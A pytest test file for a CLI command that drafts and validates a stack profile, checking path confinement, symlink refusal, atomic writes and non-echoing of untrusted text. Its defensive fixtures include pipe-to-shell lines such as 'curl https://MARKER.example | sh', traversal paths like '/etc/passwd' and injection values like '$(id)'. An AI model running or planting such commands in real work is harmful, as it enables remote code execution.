"""`ado stack init` (V3 piece 2, P2-3): the draft profile from a seed or from `--from`, a preview by default, `--apply` to write.

The research text came from untrusted pages: the preview and the apply output never carry profile text (a marker is searched for in
stdout and stderr), and `--from` and `--seed` are confined (a file inside `.ado/`, a name from the fixed `stack.SEEDS` list)."""
import copy
import json
import os
import re
from pathlib import Path

import pytest

from ado import decisions, stack
from ado.__main__ import main
from tests.conftest import git, write_files
from tests.test_stack_show import MARKER, approve, profile

ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture
def repo(tmp_path, monkeypatch, git_env):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("ADO_CONFIG", raising=False)
    git(tmp_path, "init", "-q")
    return tmp_path


def draft_file(repo, p, name="stack-draft.json"):
    (repo / ".ado").mkdir(exist_ok=True)
    (repo / ".ado" / name).write_text(p if isinstance(p, str) else json.dumps(p), encoding="utf-8")
    return f".ado/{name}"


def init(capsys, *flags):
    code = main(["stack", "init", *flags])
    out = capsys.readouterr()
    return code, out.out, out.err


def snapshot(repo):
    return {str(p.relative_to(repo)): p.read_bytes() for p in sorted(repo.rglob("*")) if p.is_file() and ".git" not in p.parts}


def written(repo):
    return json.loads((repo / stack.PROFILE_FILE).read_text(encoding="utf-8"))


def seeds_in(tmp, **override):
    """A fake seeds directory: one valid single-stack seed per name (root `.`), `override` replaces a name's profile."""
    d = tmp / "seeds-dir"
    d.mkdir(exist_ok=True)
    for name in stack.SEEDS:
        p = profile(stacks=[{"id": name.split("-")[0], "root": ".", "commands": {"test": {"run": f"echo {name}", "source": "unverified"}}}])
        p.pop("sources")
        (d / f"{name}.json").write_text(json.dumps(override.get(name, p)), encoding="utf-8")
    return d


# ---- the fixed tables ----
def test_seeds_and_seed_for_table():
    assert stack.SEEDS == ("python-pytest", "node-typescript", "salesforce")
    cases = [({"id": "python", "hints": {}}, "python-pytest"), ({"id": "python"}, "python-pytest"),
             ({"id": "typescript", "hints": {"package_manager": "npm"}}, "node-typescript"),
             ({"id": "node", "hints": {"package_manager": "npm"}}, "node-typescript"),
             ({"id": "node", "hints": {"package_manager": "pnpm"}}, None), ({"id": "node", "hints": {"package_manager": "yarn"}}, None),
             ({"id": "typescript", "hints": {"package_manager": "ambiguous"}}, None), ({"id": "node", "hints": {}}, None),
             ({"id": "salesforce", "hints": {"lwc_jest": True}}, "salesforce"),
             ({"id": "flutter", "hints": {}}, None), ({"id": "java", "hints": {"build_tool": "maven"}}, None),
             ({"id": "go"}, None), ({}, None)]
    for detected, seed in cases:
        assert stack.seed_for(detected) == seed, detected


def test_placeholder_or_real_seeds_ship_and_validate():
    for name in stack.SEEDS:
        raw = (Path(stack.SEEDS_DIR) / f"{name}.json").read_bytes()
        data = stack.parse_json(raw, stack.MAX_PROFILE)
        assert stack.validate(data) == [], name
        assert data["status"] == "draft" and "approval" not in data


def test_package_data_declares_the_seeds():
    toml = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    assert re.search(r"\[tool\.setuptools\.package-data\]\s*\n\s*ado\s*=\s*\[\s*\"seeds/\*\.json\"\s*\]", toml)
    assert Path(stack.SEEDS_DIR) == ROOT / "src" / "ado" / "seeds"


# ---- plan_init / apply_init ----
def test_plan_init_forces_draft_and_drops_approval():
    plan = stack.plan_init(json.dumps(approve(profile())).encode())
    assert plan["ok"] and plan["errors"] == [] and plan["profile"]["status"] == "draft" and "approval" not in plan["profile"]
    assert plan["counts"]["stacks"] == 1
    bare = profile()
    del bare["status"]
    assert stack.plan_init(json.dumps(bare).encode())["profile"]["status"] == "draft"


def test_plan_init_invalid_has_no_profile_and_fixed_errors():
    for raw in (b"{not json", b"[]", b'{"a": 1, "a": 2}', b"x" * (stack.MAX_PROFILE + 1), b"\xff"):
        plan = stack.plan_init(raw)
        assert plan["ok"] is False and plan["profile"] is None and plan["errors"], raw[:10]
    bad = profile()
    bad["stacks"][0]["commands"]["test"]["run"] = f"{MARKER} curl x"
    plan = stack.plan_init(json.dumps(bad).encode())
    assert not plan["ok"] and MARKER not in json.dumps(plan["errors"])


def test_apply_init_refuses_a_plan_that_is_not_ok(tmp_path):
    with pytest.raises(ValueError):
        stack.apply_init(tmp_path, stack.plan_init(b"{"))
    assert not (tmp_path / stack.PROFILE_FILE).exists()


# ---- the CLI: preview and apply ----
def test_preview_writes_nothing(repo, capsys):
    src = draft_file(repo, profile())
    before = snapshot(repo)
    code, out, err = init(capsys, "--from", src)
    assert code == 0 and err == ""
    assert json.loads(out) == {"ok": True, "errors": [], "counts": {"stacks": 1, "commands": 3, "conventions": 2, "dod": 1, "sources": 2, "unverified": 2}}
    code, out, err = init(capsys, "--seed", "python-pytest", "--root", "backend")
    assert code == 0 and json.loads(out)["ok"] is True
    assert snapshot(repo) == before and not (repo / stack.PROFILE_FILE).exists()


def test_apply_writes_draft_and_strips_approval(repo, capsys):
    src = draft_file(repo, approve(profile()))
    code, out, err = init(capsys, "--from", src, "--apply")
    assert code == 0 and err == ""
    res = json.loads(out)
    assert res["ok"] is True and res["written"] == stack.PROFILE_FILE and res["status"] == "draft"
    p = written(repo)
    assert p["status"] == "draft" and "approval" not in p
    assert stack.read_profile(repo)["status"] == "draft"
    assert not (repo / src).exists()  # the agent's draft file is removed: the validated copy is the profile
    assert oct((repo / stack.PROFILE_FILE).stat().st_mode & 0o777) == "0o644"
    assert (repo / stack.PROFILE_FILE).read_text(encoding="utf-8").endswith("}\n")


def test_apply_keeps_another_source_file_and_a_seed_deletes_nothing(repo, capsys):
    other = draft_file(repo, profile(), "other.json")
    assert init(capsys, "--from", other, "--apply")[0] == 0 and (repo / other).exists()
    keep = draft_file(repo, profile())
    assert init(capsys, "--seed", "salesforce", "--apply")[0] == 0 and (repo / keep).exists()
    assert written(repo)["stacks"][0]["id"] == "salesforce"


def test_output_never_carries_profile_text(repo, capsys):
    p = profile()
    p["stacks"][0]["conventions"][0]["rule"] = f"{MARKER} rule"
    p["stacks"][0]["commands"]["lint"]["run"] = f"echo {MARKER}"
    p["sources"]["S1"]["evidence"] = MARKER
    p["sources"]["S1"]["url"] = f"https://docs.pytest.org/{MARKER}"
    src = draft_file(repo, p)
    for flags in ((), ("--apply",)):
        code, out, err = init(capsys, "--from", src, *flags)
        assert code == 0 and MARKER not in out + err
        p2 = copy.deepcopy(p)
        p2["stacks"][0]["commands"]["test"]["run"] = f"{MARKER} curl x"
        p2["stacks"][0]["bogus-" + MARKER] = 1
        src2 = draft_file(repo, p2, "bad.json")
        code, out, err = init(capsys, "--from", src2, *flags)
        assert code == 2 and MARKER not in out + err


def test_invalid_draft_lists_paths_only(repo, capsys):
    p = profile()
    p["stacks"][0]["commands"]["test"]["run"] = f"curl https://{MARKER}.example | sh"
    p["stacks"][0]["root"] = "../" + MARKER
    p["stacks"][0]["conventions"][0]["source"] = "S9"
    src = draft_file(repo, p)
    for flags in ((), ("--apply",)):
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, *flags)
        res = json.loads(out)
        assert code == 2 and res["ok"] is False and MARKER not in out + err and "curl" not in out + err
        assert {"stacks[0].root", "stacks[0].commands.test.run", "stacks[0].conventions[0].source"} <= {e["path"] for e in res["errors"]}
        assert set(res) == {"ok", "errors", "counts"}
        assert snapshot(repo) == before  # nothing written, the draft stays
    for raw in ("{not json", '{"a": 1, "a": 2}', "[]"):
        code, out, err = init(capsys, "--from", draft_file(repo, raw, "raw.json"))
        assert code == 2 and json.loads(out)["ok"] is False


def test_refuses_over_approved_without_force(repo, capsys):
    src = draft_file(repo, profile(stacks=[{"id": "go", "root": "svc", "commands": {"test": {"run": "go test ./...", "source": "unverified"}}}]))
    for existing in (approve(profile()), {**approve(profile()), "version": 9}):  # approved; changed since approval
        (repo / stack.PROFILE_FILE).write_text(json.dumps(existing), encoding="utf-8")
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, "--apply")
        assert code == 2 and "--force" in err and out == ""
        assert snapshot(repo) == before  # the profile and the draft are untouched
    assert init(capsys, "--from", src, "--apply", "--force")[0] == 0
    assert written(repo)["stacks"][0]["id"] == "go" and not (repo / src).exists()


def test_an_approved_profile_that_is_now_invalid_or_symlinked_is_not_replaced_silently(repo, capsys):
    src = draft_file(repo, profile())
    hand_edited = approve(profile())
    hand_edited["stacks"][0]["commands"]["lint"]["run"] = "curl https://x.example | sh"  # a tripwire token added by hand: now invalid
    with_approval_only = {**profile(), "approval": {"by": "tech lead"}}
    for existing in (hand_edited, with_approval_only, {**approve(profile()), "unknown-key": 1}):
        (repo / stack.PROFILE_FILE).write_text(json.dumps(existing), encoding="utf-8")
        assert stack.read_profile(repo)["status"] == "invalid"
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, "--apply")
        assert code == 2 and "--force" in err and out == "" and snapshot(repo) == before
        assert init(capsys, "--from", src, "--apply", "--force")[0] == 0
        draft_file(repo, profile())
    # a symlinked destination is refused entirely, with or without --force, and the target is untouched
    target = repo / "elsewhere.json"
    target.write_text(json.dumps(approve(profile())), encoding="utf-8")
    (repo / stack.PROFILE_FILE).unlink()
    os.symlink(target, repo / stack.PROFILE_FILE)
    before = target.read_bytes()
    for flags in ((), ("--force",)):
        code, out, err = init(capsys, "--from", src, "--apply", *flags)
        assert code == 2 and "symlink" in err and out == "" and target.read_bytes() == before and (repo / stack.PROFILE_FILE).is_symlink()
        assert (repo / src).exists()


def test_an_existing_draft_or_invalid_file_is_replaced_without_force(repo, capsys):
    src = draft_file(repo, profile())
    for old in (json.dumps(profile(version=7)), "{broken"):
        (repo / stack.PROFILE_FILE).write_text(old, encoding="utf-8")
        draft_file(repo, profile())
        assert init(capsys, "--from", src, "--apply")[0] == 0 and written(repo)["version"] == 2


def test_a_failed_write_keeps_the_existing_file_and_leaves_no_temp_file(repo, capsys, monkeypatch):
    old = json.dumps(profile(version=7))
    (repo / stack.PROFILE_FILE).write_text(old, encoding="utf-8")
    src = draft_file(repo, profile())

    def boom(path, text):
        raise OSError("disk full")
    monkeypatch.setattr(decisions, "_atomic_write", boom)
    code, out, err = init(capsys, "--from", src, "--apply")
    assert code == 2 and "disk full" not in err
    assert (repo / stack.PROFILE_FILE).read_text(encoding="utf-8") == old and (repo / src).exists()


def test_apply_goes_through_the_atomic_write_and_reads_back(repo, capsys, monkeypatch):
    calls = []
    real = decisions._atomic_write
    monkeypatch.setattr(decisions, "_atomic_write", lambda path, text: (calls.append(Path(path).name), real(path, text)))
    assert init(capsys, "--from", draft_file(repo, profile()), "--apply")[0] == 0
    assert calls == [stack.PROFILE_FILE] and [p.name for p in repo.iterdir() if p.name.endswith(".tmp")] == []
    monkeypatch.setattr(decisions, "_atomic_write", lambda path, text: real(path, text[:-3]))  # a write that does not read back
    code, out, err = init(capsys, "--from", draft_file(repo, profile(), "again.json"), "--apply", "--force")
    assert code == 2 and "read back" in err


# ---- --from is confined ----
def test_from_outside_ado_dir_refused(repo, capsys):
    write_files(repo, {"x.json": json.dumps(profile()), "sub/y.json": json.dumps(profile()), ".ado/keep": ""})
    outside = repo.parent / f"{repo.name}-outside.json"
    outside.write_text(json.dumps(profile()), encoding="utf-8")
    for path in ("x.json", "sub/y.json", "./x.json", ".ado/../x.json", ".adoo/x.json", str(outside), str(repo / "x.json"), "ado.config.json", ".ado", ".ado/", "",
                 ".ado/missing.json", str(repo / ".ado")):
        code, out, err = init(capsys, "--from", path)
        assert code == 2 and out == "" and err.startswith("error: ") and "x.json" not in err and "outside" not in err.replace("inside", ""), path
        assert "ZZ" not in err
    assert not (repo / stack.PROFILE_FILE).exists()


def test_from_inside_ado_dir_absolute_or_dotted_is_accepted(repo, capsys):
    draft_file(repo, profile())
    for path in (str(repo / ".ado" / "stack-draft.json"), "./.ado/stack-draft.json", ".ado/../.ado/stack-draft.json"):
        assert init(capsys, "--from", path)[0] == 0, path


def test_from_symlink_refused(repo, capsys):
    real = draft_file(repo, profile(), "real.json")
    os.symlink("real.json", repo / ".ado" / "link.json")  # a symlink inside .ado to a file inside .ado
    outside = repo / "outside.json"
    outside.write_text(json.dumps(profile()), encoding="utf-8")
    os.symlink(outside, repo / ".ado" / "out.json")
    for path in (".ado/link.json", ".ado/out.json"):
        code, out, err = init(capsys, "--from", path, "--apply")
        assert code == 2 and out == "", path
    assert init(capsys, "--from", real)[0] == 0
    assert not (repo / stack.PROFILE_FILE).exists()


def test_from_a_hard_link_refused_and_the_text_names_the_caps(repo, capsys):
    real = draft_file(repo, profile(), "real.json")
    os.link(repo / real, repo / ".ado" / "hard.json")
    code, out, err = init(capsys, "--from", ".ado/hard.json", "--apply")
    assert code == 2 and out == "" and "256 KiB" in err and "single-link" in err and not (repo / stack.PROFILE_FILE).exists()
    os.unlink(repo / ".ado" / "hard.json")
    assert init(capsys, "--from", real)[0] == 0


def test_from_when_ado_dir_is_a_symlink_refused(repo, capsys):
    elsewhere = repo / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "d.json").write_text(json.dumps(profile()), encoding="utf-8")
    os.symlink(elsewhere, repo / ".ado")
    code, out, err = init(capsys, "--from", ".ado/d.json", "--apply")
    assert code == 2 and not (repo / stack.PROFILE_FILE).exists()


def test_from_not_a_regular_file_or_too_big_refused(repo, capsys):
    (repo / ".ado").mkdir()
    os.mkfifo(repo / ".ado" / "fifo.json")
    (repo / ".ado" / "adir.json").mkdir()
    (repo / ".ado" / "big.json").write_text(" " * (stack.MAX_PROFILE + 1) + json.dumps(profile()), encoding="utf-8")
    (repo / ".ado" / "bin.json").write_bytes(b"\xff\xfe{}")
    for path in (".ado/fifo.json", ".ado/adir.json", ".ado/big.json", ".ado/bin.json"):
        code, out, err = init(capsys, "--from", path)
        assert code == 2, path
    assert not (repo / stack.PROFILE_FILE).exists()


# ---- --seed is looked up only among stack.SEEDS ----
def test_seed_name_not_in_list_exit_2(repo, capsys, monkeypatch, tmp_path):
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path))
    (tmp_path / "x.json").write_text(json.dumps(profile()), encoding="utf-8")
    (tmp_path / "y.json").write_text(json.dumps(profile()), encoding="utf-8")
    texts = set()
    for name in ("../x", "python-pytest/../y", "../seeds-dir/python-pytest", "python-pytest/", "python-pytest\n", " python-pytest", "Python-Pytest", "python", "", "/etc/passwd",
                 "python-pytest.json", "python-pytest\x00"):
        code, out, err = init(capsys, "--seed", name, "--root", "backend", "--apply")
        assert code == 2 and out == "" and err.startswith("error: "), name
        texts.add(err)
        assert "unknown seed" in err, name
        assert not (repo / stack.PROFILE_FILE).exists(), name
    assert len(texts) == 1  # one fixed text: the input is never echoed


def test_seed_lookup_never_builds_a_path_from_the_input(monkeypatch, tmp_path):
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path))
    for bad in ("../x", "python-pytest/../python-pytest"):
        with pytest.raises(ValueError):
            stack.plan_init(bad, root=str(tmp_path), seed_root=".")
    assert stack.plan_init("python-pytest", root=str(tmp_path), seed_root=".")["ok"]


def test_a_missing_or_broken_seed_file_is_exit_2(repo, capsys, monkeypatch, tmp_path):
    d = seeds_in(tmp_path)
    (d / "salesforce.json").unlink()
    (d / "node-typescript.json").write_text("{broken", encoding="utf-8")
    monkeypatch.setattr(stack, "SEEDS_DIR", d)
    for name in ("salesforce", "node-typescript"):
        code, out, err = init(capsys, "--seed", name, "--root", ".")
        assert code == 2 and not (repo / stack.PROFILE_FILE).exists(), name


def test_seed_uses_detected_root(repo, capsys):
    write_files(repo, {"backend/pyproject.toml": "[project]\nname='x'\n"})
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    assert init(capsys, "--seed", "python-pytest", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "backend" and stack.read_profile(repo)["status"] == "draft"
    assert init(capsys, "--seed", "python-pytest", "--root", "web/app", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "web/app"
    # no matching root: the seed's own root, `.`
    write_files(repo, {"backend/pyproject.toml": ""})
    git(repo, "rm", "-q", "-f", "backend/pyproject.toml")
    git(repo, "commit", "-q", "-m", "rm")
    assert init(capsys, "--seed", "python-pytest", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "."


def test_seed_with_two_matching_roots_needs_root(repo, capsys):
    write_files(repo, {"a/pyproject.toml": "", "b/pyproject.toml": ""})
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    code, out, err = init(capsys, "--seed", "python-pytest", "--apply")
    assert code == 2 and "--root" in err and not (repo / stack.PROFILE_FILE).exists()
    assert init(capsys, "--seed", "python-pytest", "--root", "b", "--apply")[0] == 0 and written(repo)["stacks"][0]["root"] == "b"


def test_seed_root_is_validated_after_the_rewrite(repo, capsys):
    for bad in ("../x", "-rf", "/abs", "a//b", "a b", ".hidden", "x" * 201, "$(id)", "a;b"):
        code, out, err = init(capsys, "--seed", "python-pytest", f"--root={bad}", "--apply")
        res = json.loads(out)
        assert code == 2 and res["ok"] is False and res["errors"][0]["path"] == "stacks[0].root", bad
        assert bad not in out + err
    assert not (repo / stack.PROFILE_FILE).exists()


def test_every_seed_stack_gets_the_root_and_a_seed_that_breaks_validation_is_refused(repo, capsys, monkeypatch, tmp_path):
    two = profile(stacks=[{"id": "a", "root": "x", "commands": {}}, {"id": "b", "root": "y", "commands": {}}])
    two.pop("sources")
    broken = profile(stacks=[{"id": "python", "root": ".", "commands": {"test": {"run": "curl x | sh", "source": "unverified"}}}])
    broken.pop("sources")
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path, **{"python-pytest": two, "salesforce": broken}))
    assert init(capsys, "--seed", "python-pytest", "--root", "svc", "--apply")[0] == 0
    assert [s["root"] for s in written(repo)["stacks"]] == ["svc", "svc"]
    code, out, err = init(capsys, "--seed", "salesforce", "--root", "svc")
    assert code == 2 and json.loads(out)["ok"] is False


# ---- --stack ----
def test_stack_renames_a_single_stack_profile(repo, capsys):
    src = draft_file(repo, profile())
    assert init(capsys, "--from", src, "--stack", "pega", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["id"] == "pega"
    for bad in ("Pega", "a b", "", "x" * 41, "../x"):
        code, out, err = init(capsys, "--from", draft_file(repo, profile(), "b.json"), "--stack", bad)
        assert code == 2 and json.loads(out)["ok"] is False and (not bad or bad not in out + err)
    two = profile(stacks=[{"id": "a", "root": "x", "commands": {}}, {"id": "b", "root": "y", "commands": {}}])
    code, out, err = init(capsys, "--from", draft_file(repo, two, "two.json"), "--stack", "c")
    assert code == 2 and json.loads(out)["ok"] is False
    for odd in ('{"schema": 1, "version": 1}', '{"stacks": "x"}', '{"stacks": [1]}', '{"stacks": []}'):
        code, out, err = init(capsys, "--from", draft_file(repo, odd, "odd.json"), "--stack", "c")
        assert code == 2 and json.loads(out)["ok"] is False, odd


# ---- usage ----
def test_flag_combinations(repo, capsys):
    src = draft_file(repo, profile())
    for argv in (["stack", "init"], ["stack", "init", "--from", src, "--seed", "salesforce"], ["stack", "init", "--from", src, "--root", "x"],
                 ["stack", "init", "--from", src, "--force"], ["stack", "init", "--seed", "salesforce", "--force"]):
        with pytest.raises(SystemExit) as e:
            main(argv)
        assert e.value.code == 2, argv
        capsys.readouterr()
    assert not (repo / stack.PROFILE_FILE).exists()


def test_init_needs_no_config_token_or_git_for_from(tmp_path, monkeypatch, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("ADO_CONFIG", raising=False)
    (tmp_path / ".ado").mkdir()
    (tmp_path / ".ado" / "d.json").write_text(json.dumps(profile()), encoding="utf-8")
    assert init(capsys, "--from", ".ado/d.json", "--apply")[0] == 0
